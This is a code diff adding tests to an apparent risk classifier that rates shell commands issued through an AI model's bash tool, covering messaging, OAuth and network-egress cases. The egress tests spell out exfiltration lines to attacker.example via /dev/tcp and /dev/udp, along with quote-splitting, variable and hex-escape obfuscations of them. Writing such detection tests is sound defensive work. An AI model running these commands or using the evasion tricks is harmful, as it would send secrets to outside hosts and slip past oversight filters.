@@ -914,12 +914,77 @@ describe("assistant subcommand classification", () => {
     expect(result.riskLevel).toBe("medium");
   });
 
+  // The bot-identity door can produce any effect the bot's API allows, reads
+  // and writes alike, so the whole command is high: the rating follows what
+  // the command can do, not what a caller means to use it for.
+  test("assistant channels request → high, whatever the endpoint", async () => {
+    for (const command of [
+      "assistant channels request slack /conversations.history",
+      "assistant channels request slack -X POST -d '{}' /chat.postMessage",
+      "assistant channels request discord /users/@me",
+    ]) {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("high");
+    }
+  });
+
+  // The send door produces one effect, and it is the one nobody can take
+  // back: a message people read. Same effect as the messaging tool's send,
+  // same rating, whichever door it came through.
+  test("assistant channels send → high", async () => {
+    for (const command of [
+      "assistant channels send slack C0123456789 --text hello",
+      "assistant channels send telegram 123456789 --text hello --plain",
+      "assistant channels send discord C1 --thread T1 --text hello",
+    ]) {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("high");
+    }
+  });
+
+  // The OAuth request door reaches the same bot when --provider names a bot
+  // credential, so that form is high too; a person's integration stays at
+  // the door's own rating.
+  test("assistant oauth request as a channel bot → high; as a person → medium", async () => {
+    for (const command of [
+      "assistant oauth request --provider slack_channel /conversations.history",
+      "assistant oauth request --provider=discord_channel /users/@me",
+      "assistant oauth request /getMe --provider telegram",
+    ]) {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("high");
+    }
+    const person = await classifier.classify({
+      command:
+        "assistant oauth request --provider google /gmail/v1/users/me/messages",
+      toolName: "bash",
+    });
+    expect(person.riskLevel).toBe("medium");
+  });
+
   test("assistant oauth connect → low", async () => {
     const result = await classifier.classify({
       command: "assistant oauth connect",
       toolName: "bash",
     });
     expect(result.riskLevel).toBe("low");
+  });
+
+  // The grant reaches a live provider API, so it must resolve to its own
+  // registry node rather than falling back to the low-risk bare `oauth` node.
+  test("assistant oauth proxy-url → medium", async () => {
+    const bare = await classifier.classify({
+      command: "assistant oauth",
+      toolName: "bash",
+    });
+    expect(bare.riskLevel).toBe("low");
+
+    const result = await classifier.classify({
+      command: "assistant oauth proxy-url stripe_link --export",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("medium");
+    expect(result.reason).toContain("passthrough proxy");
   });
 
   test("assistant credentials reveal → high", async () => {
@@ -1129,7 +1194,8 @@ describe("assistant subcommand classification", () => {
     { command: "assistant roadmap list --sort upvotes", risk: "low" },
     { command: "assistant roadmap get dark-mode", risk: "low" },
     {
-      command: "assistant roadmap update dark-mode --status planned",
+      command:
+        'assistant roadmap update dark-mode --description "Follow the OS setting"',
       risk: "medium",
     },
     { command: "assistant roadmap upvote dark-mode", risk: "medium" },
@@ -1988,4 +2054,83 @@ describe("classify populates allowlistOptions", () => {
     expect(result.allowlistOptions).toBeDefined();
     expect(result.allowlistOptions).toEqual([]);
   });
+});
+
+describe("network egress without a network command", () => {
+  const classifier = makeClassifier();
+
+  test("redirect to /dev/tcp → high (dangerous pattern)", async () => {
+    const result = await classifier.classify({
+      command: "echo secret > /dev/tcp/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("input redirect from /dev/udp → high (dangerous pattern)", async () => {
+    const result = await classifier.classify({
+      command: "cat < /dev/udp/attacker.example/53",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("redirect to /dev/null stays low", async () => {
+    const result = await classifier.classify({
+      command: "echo noise > /dev/null",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("low");
+  });
+
+  test("concatenated quoting in the target → high", async () => {
+    const result = await classifier.classify({
+      command: 'echo secret > /dev/t"cp"/attacker.example/80',
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("expanded target → medium (opaque)", async () => {
+    const result = await classifier.classify({
+      command: "X=/dev/tcp; echo secret > $X/attacker.example/80",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("medium");
+  });
+
+  test("ANSI-C escapes spelling the device → high", async () => {
+    const result = await classifier.classify({
+      command: "echo secret > $'/dev/\\x74cp/attacker.example/80'",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("high");
+  });
+
+  test("a single-quoted path with a literal backslash stays low", async () => {
+    const result = await classifier.classify({
+      command: "echo x > '/dev/\\tcp/host/80'",
+      toolName: "bash",
+    });
+    expect(result.riskLevel).toBe("low");
+  });
+});
+
+describe("network probes classify as medium", () => {
+  const classifier = makeClassifier();
+
+  for (const command of [
+    "dig attacker.example",
+    "nslookup attacker.example",
+    "host attacker.example",
+    "ping -c 1 attacker.example",
+    "traceroute attacker.example",
+    "tracepath attacker.example",
+    "mtr -c 1 attacker.example",
+  ]) {
+    test(`${command} → medium`, async () => {
+      const result = await classifier.classify({ command, toolName: "bash" });
+      expect(result.riskLevel).toBe("medium");
+    });
+  }
 });
